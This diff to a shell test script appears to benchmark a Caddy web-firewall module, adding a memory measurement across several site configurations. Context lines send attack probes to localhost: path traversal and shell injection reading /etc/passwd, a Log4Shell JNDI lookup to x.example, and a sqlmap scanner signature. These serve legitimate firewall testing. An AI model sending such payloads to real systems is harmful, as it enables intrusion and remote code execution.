@@ -146,3 +146,17 @@ echo "  path traversal $($C "$B/../../../../etc/passwd" --path-as-is)"
 echo "  shell injection $($C -X POST --data 'cmd=;cat /etc/passwd' $B/)"
 echo "  log4shell $($C -H 'User-Agent: ${jndi:ldap://x.example/a}' $B/)"
 echo "  scanner $($C -H 'User-Agent: sqlmap/1.8' $B/)"
+
+say "Memory: Caddy with 1, 20, and 20 sites sharing one firewall block"
+mem() { # mem <name> <Caddyfile>: Caddy's memory once it has loaded it
+    "$CADDY" run --config "$2" --adapter caddyfile > /dev/null 2>&1 & local pid=$!
+    sleep 6; for p in $(seq 0 19); do curl -s -o /dev/null "http://127.0.0.1:$((19100 + p))/" ; done; curl -s -o /dev/null "http://127.0.0.1:19200/"; sleep 1
+    echo "  $1: $(awk '/VmRSS/ {printf "%d MB", $2/1024}' /proc/$pid/status)"; kill $pid; wait $pid 2> /dev/null
+}
+for n in 1 20; do
+    { echo "{"; echo "	admin off"; echo "}"; for p in $(seq 0 $((n - 1))); do echo "http://127.0.0.1:$((19100 + p)) {"; echo "	route {"; waf On "m$p" | sed 's/^/	/'; echo "		respond ok"; echo "	}"; echo "}"; done; } > "$W/m$n.caddy"
+    mem "$n site(s), each its own block" "$W/m$n.caddy"
+done
+{ echo "{"; echo "	admin off"; echo "}"; echo -n "http://127.0.0.1:19200"; for p in $(seq 0 19); do echo -n ", http://127.0.0.1:$((19100 + p))"; done; echo " {"
+  echo "	route {"; waf On shared | sed 's/^/	/'; echo "		respond ok"; echo "	}"; echo "}"; } > "$W/mshared.caddy"
+mem "20 sites in one block" "$W/mshared.caddy"
